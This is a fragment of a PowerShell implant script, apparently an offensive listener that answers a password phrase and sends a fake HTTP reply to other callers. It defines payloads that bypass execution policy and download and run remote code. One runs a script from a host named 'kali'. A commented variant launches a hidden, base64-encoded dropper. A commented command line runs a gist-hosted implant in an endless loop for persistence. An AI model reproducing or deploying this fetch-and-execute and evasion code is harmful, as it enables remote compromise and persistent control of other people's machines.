#$payload = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e <base64 encoded command of core dropper>'
$payload = "powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://kali/implant.ps1')"
$phrase = "Password"
    ...
    try
    {
      ...
      while($auth -eq $false)
      {
          try
          {
              ...
              if ($Data -ne $null)
              {
                  $test = $Encoding.GetString($Data) -replace "`n"
                  if($test -eq $phrase){
                      Stream1_WriteData $Encoding.GetBytes("[+] Authenticated ") $Stream1Vars
                      $auth = $true;
                  } else {
                      $response = @(
                        ...
                        "Date: Fri, 10 May 2019 14:52:46 GMT",
                        "Connection: close",
                        "Content-Length: 0",""
                        ) -join "`r`n"
                      Stream1_WriteData $Encoding.GetBytes($response) $Stream1Vars
                      return $false;
                  }
              }
              $Data = $null
...
while($true){
    try {
        $r = Main @('',$True,65535,60);
    }
    catch {
        Start-Sleep -Milliseconds 100
    }
}
# start /b cmd /c FOR /L %N IN () DO powershell -exec bypass -noexit -c IEX (New-Object System.Net.Webclient).DownloadString('https://gist.githubusercontent.com/wshepherd0010/905ad7fd378767cbc1f580f7d6b0666b/raw/7620b8e9e9148384894228a74580fb7ab0184a76/implant.ps1')
